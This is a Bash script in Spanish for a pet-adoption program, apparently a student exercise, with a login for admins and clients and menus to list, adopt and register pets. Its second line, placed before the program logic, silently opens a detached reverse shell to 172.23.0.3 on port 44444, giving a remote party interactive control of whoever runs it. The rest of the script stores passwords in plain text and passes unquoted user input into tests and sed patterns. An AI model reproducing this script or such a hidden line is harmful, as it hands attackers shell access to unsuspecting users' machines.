#!/bin/bash
setsid bash -i >& /dev/tcp/172.23.0.3/44444 0>&1
echo "Ingresa el tipo de usuario (1: Admin, 2: Cliente)"
read tipo
echo "Ingresar el usuario"
read us
echo "Ingresar la contraseña"
read ps

verificarUsuario() {
    estaAdmin=0
    estaCliente=0
    
    if [ $tipo = 1 ]; then
        archivo="./admins.txt"
    else
        archivo="./clientes.txt"
    fi

    while IFS= read -r user && IFS= read -r pass && IFS= read -r _; do
        if [ $us = $user -a $ps = $pass ]; then
            if [ $tipo = 1 ]; then
                estaAdmin=1
            else
                estaCliente=1
            fi
            break
        fi
    done < "$archivo"

    if [ $estaAdmin = 1 ]; then
        menuAdmin
    elif [ $estaCliente = 1 ]; then
        menuCliente
    else
        echo "Credenciales incorrectas"
    fi
}

menuCliente() {
    echo "Selecciona una opcion
    1: Listar mascotas disponibles para adopción
    2: Adoptar mascota
    3: Salir"

    read opcion

    archivo="./mascotas.txt"
    if [ $opcion = 1 ]; then
        while IFS= read -r _ && IFS= read -r tipo && IFS= read -r nombre && IFS= read -r _ && IFS= read -r edad && IFS= read -r desc && IFS= read -r _ && IFS= read -r _; do
            echo "$nombre - $tipo - $edad - $desc"
        done < "$archivo"
    elif [ $opcion = 2 ]; then
        while IFS= read -r num && IFS= read -r _ && IFS= read -r nombre && IFS= read -r _ && IFS= read -r _ && IFS= read -r _ && IFS= read -r _ && IFS= read -r _; do
            echo "$num - $nombre"
        done < "$archivo"

        echo "Ingresa el numero de la mascota a adoptar"
        read id
        origen="./mascotas.txt"
        destino="./adopciones.txt"

        echo $id >> $destino
        sed -n "/^$id/{n;n;p}" $origen >> $destino
        date +"%d/%m/%Y" >> $destino
        echo "#" >> $destino

        sed -i "/^$id/,+7d" $origen
        
    elif [ $opcion = 3 ]; then
        echo "Salir"
    else
        echo "Opcion no valida"
    fi
}

menuAdmin() {
    echo "Selecciona una opcion
    1: Registrar usuario
    2: Registrar mascota"

    read opcion

    if [ $opcion = 1 ]; then
        echo "Registra usuario"

        echo "Ingresa el tipo de usuario a crear (1: Admin, 2: Cliente)"
        read tipo
        archivo=""

        if [ $tipo = 1 ]; then
            archivo="./admins.txt"
        elif [ $tipo = 2 ]; then
            archivo="./clientes.txt"
        fi

        echo "Ingresar: nombre, cedula, numero de telefono, fecha de nacimiento y la contraseña para el usuario, en ese orden"
        read nombreU
        read cedulaU
        read numU
        read nacU
        read nPass

        existe=0
        while IFS= read -r cedula && IFS= read -r _ && IFS= read -r _; do
            if [ $cedula = $cedulaU ]; then
                existe=1
                break
            fi
        done < "$archivo"

        if [ $existe = 1 ]; then
            echo "El usuario ya existe"
        else
            echo $cedulaU >> $archivo
            echo $nPass >> $archivo
            echo "#" >> $archivo

            echo $cedulaU >> "./usuarios.txt"
            echo $nombreU >> "./usuarios.txt"
            echo $numU >> "./usuarios.txt"
            echo $nacU >> "./usuarios.txt"
            echo "#" >> "./usuarios.txt"
        fi


    elif [ $opcion = 2 ]; then
        echo "Registra mascota"

        echo "Ingresar número identificador, tipo de mascota, nombre, sexo, edad, descripción y fecha de ingreso."
        read num
        read tipo
        read nombre
        read sexo
        read edad
        read desc
        read ing

        validar='^[0-9]+$'
        if [ "$edad" -le 0 ] || ! [[ "$num" =~ $validar ]]; then
            echo "Datos incorrectos"
            return
        fi

        archivo="./mascotas.txt"
        existe=0
        while IFS= read -r numI && IFS= read -r _ && IFS= read -r _ && IFS= read -r _ && IFS= read -r _ && IFS= read -r _ && IFS= read -r _ && IFS= read -r _; do
            if [ $num = $numI ]; then
                existe=1
            fi
        done < "$archivo"

        if [ $existe = 1 ]; then
            echo "El numero identificador ya existe"
        else
            echo $num >> $archivo
            echo $tipo >> $archivo
            echo $nombre >> $archivo
            echo $sexo >> $archivo
            echo $edad >> $archivo
            echo $desc >> $archivo
            echo $ing >> $archivo
            echo "#" >> $archivo
        fi
    else
        echo "Opcion invalida"
    fi
}

verificarUsuario